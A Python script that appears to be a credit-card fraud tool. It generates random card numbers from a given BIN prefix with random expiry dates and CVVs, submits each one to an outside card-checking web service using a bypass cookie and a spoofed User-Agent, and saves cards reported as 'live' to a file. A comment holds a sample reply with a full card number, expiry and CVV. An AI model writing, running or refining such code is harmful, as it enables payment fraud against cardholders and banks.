def check(card):

    import requests

    cookies = {
        "cf_clearance":"n9GNE8cq6kf27g2OTdWMOjXJspMS93QPkHyRs3quukc-1691429589-0-1-a9682039.44a22f23.2a63c3e-160.2.1691429589",
    }

    x = requests.post("https://www.mrchecker.net/card-checker//ccn2/api.php",{
        "data":str(card)
    }, cookies=cookies,
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    })

    # {"error":3,"msg":"<div><b style='color:#800080;'>Unknown</b> | 4532727601455188|01|2023|445 | [GATE:01] @/ChkNET-ID</div>"}

    import json

    d = json.loads(x.text)
    msg = d["msg"]

    if "Invalid" in msg:
        return "invalid"
    elif "Live" in msg:
        return "live"
    elif "Unknown" in msg:
        return "unknown"
    elif "Die" in msg:
        return "die"
    else:
        k = open("exceptions.txt","a")
        import time
        k.write(f"{time.time} - \nCARD_INVALID_CODE: {msg}; CARD: {str(card)}")
        return "error"
def save_card(card):
    try:
        x = open("live.txt","a")
        x.write("\n"+str(card))
        x.close()
        return 0
    except Exception as e:
        k = open("exceptions.txt","a")
        import time
        k.write(f"{time.time} - \nEXCEPTION: {str(e)}; CARD: {str(card)}")
        return 1

def gen_number(count):
    import random
    list1 = [0,1,2,3,4,5,6,7,8,9]
    x = ""
    for i in range(count):
        x += str(random.choice(list1))
    return x

def gen_month():
    import random
    list1 = ["01","02","03","04","05","06","07","08","09","10","11","12"]
    
    return random.choice(list1)

def gen_year():
    import random
    list1 = ["2023","2024","2025","2026","2027","2028","2029","2030","2031"]
    
    return random.choice(list1)


def generate_cards(bin, amount):
    # card is 16 lenght
    list1 = {}
    for i in range(int(amount)):
        am1 = 16-len(str(bin)) # amount of numbers to generate
        nums = gen_number(am1)
        nums2 = gen_month()
        nums3 = gen_year()
        cvv = gen_number(3)
        card = str(bin)+str(nums)+"|"+str(nums2)+"|"+str(nums3)+"|"+str(cvv)
        list1[card] = 1
    return list1

    
if __name__ == "__main__":
    print("Script is only for importing -------")
    print("Sorry, but we closing. -------------")
    import sys
    sys.exit(1)